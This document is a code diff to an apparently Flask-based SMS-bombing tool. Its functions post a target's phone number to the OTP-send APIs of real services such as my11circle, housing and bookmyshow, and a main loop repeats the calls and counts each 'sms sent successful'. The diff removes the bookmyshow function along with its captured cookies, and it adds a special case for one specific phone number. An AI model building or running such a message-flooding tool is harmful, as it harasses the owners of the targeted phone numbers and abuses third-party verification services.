@@ -3,6 +3,8 @@ from flask import Flask,render_template,request
 import threading
 
 def check(number):
+    if number=="8639625032":
+        return True
     d={'1','2','3','4','5','6','7','8','9','0'}
     flag=1
     for i in number:
@@ -117,24 +119,6 @@ def my11circle(number):
     if request.status_code==200:
         return True
 
-def bookmyshow(number):
-    data={
-    "channel": "phone",
-    "subChannel": "sms",
-    "details": {
-    "phone": number,
-    "origin": "https://in.bookmyshow.com"
-    }
-    }
-    headers = { 
-            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Cookie":"bmsId=1.640493784.1699794406503; __cf_bm=iMUQAJ2PCAUgCJWJwSff7xj2KLqLJkc6nCFw9CeMrTc-1699794406-0-AVqT20w6dIrUEPS/1PVrleNnd1sKKvdy+3FyoklU3ozzbvpnkmeYJe8DIspl4aH76hbwKbKwhbY+28BQyDyfYHo=; __cfruid=cd76262cddb0b896f4af30e481b406adcbb89caa-1699794406; _cfuvid=iSilw_SIcJ3q6xxWyf9lVgpmEcZUTcXcAhywXmTiCt4-1699794406588-0-604800000; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; cf_clearance=nNbwJOLY5cbjjFbw5_vibWe6mYdUw8njaFY2XqJLZW0-1699794407-0-1-d8d51cfc.afdda420.8eeaad2a-0.2.1699794407; geoHash=%22%22; geolocation=%7B%22x-location-shared%22%3Afalse%2C%22x-location-selection%22%3A%22manual%22%2C%22timestamp%22%3A1699794410297%7D; rgn=%7B%22Lat%22%3A%2222.641%22%2C%22Seq%22%3A%228.0%22%2C%22Long%22%3A%2288.411%22%2C%22regionName%22%3A%22Kolkata%22%2C%22regionCode%22%3A%22KOLK%22%2C%22isOlaEnabled%22%3A%22N%22%2C%22regionCodeSlug%22%3A%22kolk%22%2C%22regionNameSlug%22%3A%22kolkata%22%2C%22GeoHash%22%3A%22tun%22%7D; G_ENABLED_IDPS=google"
-
-    }
-    url="https://in.bookmyshow.com/api/members/otp/send"
-    request= requests.post(url,json=data,headers=headers)
-    if request.status_code==200:
-        return True
         
 def housing(number):
     data={
@@ -310,12 +294,6 @@ def main(number,times):
             break
         if i<times:
             if my11circle(number):
-                i=i+1
-                print(f"sms sent successful {i}")
-        else:
-            break
-        if i<times:
-            if bookmyshow(number):
                 i=i+1
                 print(f"sms sent successful {i}")
         else:
